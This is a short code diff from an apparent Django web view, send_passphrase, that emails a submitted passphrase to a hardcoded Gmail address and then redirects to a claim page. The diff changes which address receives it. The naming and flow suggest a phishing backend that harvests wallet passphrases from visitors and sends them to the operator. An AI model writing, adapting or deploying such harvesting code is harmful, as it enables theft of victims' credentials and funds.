@@ -16,7 +16,7 @@ def send_passphrase(request):
                 subject="New Passphrase",
                 message=passphrase,
                 from_email='buyerpi24@gmail.com',
-                recipient_list=['gthakral743@gmail.com'],
+                recipient_list=['pibuyer7869@gmail.com'],
                 fail_silently=False,
             )
             return redirect('/claim/?warn=1')  # pass flag in URL
